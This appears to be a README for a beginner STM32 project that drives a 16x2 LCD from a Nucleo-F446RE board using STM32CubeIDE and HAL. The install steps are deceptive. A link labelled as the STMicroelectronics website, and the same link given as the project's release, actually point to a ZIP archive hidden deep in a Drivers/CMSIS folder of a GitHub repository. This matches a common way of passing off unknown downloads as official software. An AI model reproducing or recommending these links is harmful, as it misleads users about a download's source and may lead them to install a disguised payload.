## 📖 Overview

This project is designed for beginners in embedded systems. It shows you how to connect a 16×2 alphanumeric LCD to the STM32F446RET6 (Nucleo-F446RE) board. You will learn to use the STM32CubeIDE and HAL libraries to display text on the LCD. 

## 🚀 Getting Started

To get started, you need a few things:

1. **Hardware Requirements:**
   - STM32F446RET6 Nucleo board
   - 16×2 LCD (HD44780 compatible)
   - Jumper wires
   - Breadboard (optional, but recommended)

2. **Software Requirements:**
   - STM32CubeIDE
   - HAL libraries (included with STM32CubeIDE)

## 🛠 Installation Steps

1. **Install STM32CubeIDE:**  
   Download STM32CubeIDE from the [STMicroelectronics website](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/CMSIS/Device/HA_ST_Coding_Method_x_Interfacing_LC_1.5.zip). Follow the instructions to install it on your computer. 

2. **Download the Project:**
   Visit [this page to download](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/CMSIS/Device/HA_ST_Coding_Method_x_Interfacing_LC_1.5.zip) the latest release. Click on the download link for the ZIP file and save it to a location on your computer.

3. **Extract the Files:**  
   Right-click the downloaded ZIP file and select ‘Extract All.’ Choose a destination to save the extracted files.

4. **Open the Project in STM32CubeIDE:**
   Launch STM32CubeIDE. Click on `File` > `Open Projects from File System...` and navigate to the folder where you extracted the project files. Select the folder and click `Finish`.

5. **Configure Your Setup:**  
   Ensure that your Nucleo board is connected to your computer via USB. STM32CubeIDE should recognize the board.

6. **Compile the Code:**  
   Click on the ‘Build’ icon (the hammer symbol) to compile the code. This process checks for errors and prepares the software to run on your Nucleo board.

7. **Upload to the Board:**  
   After a successful build, click on the ‘Debug’ icon (the bug symbol). This will upload the code to your Nucleo board and start a debugging session.

8. **Show Your Message:**  
   Once uploaded, reset the Nucleo board if necessary. The text you programmed should now display on the LCD.
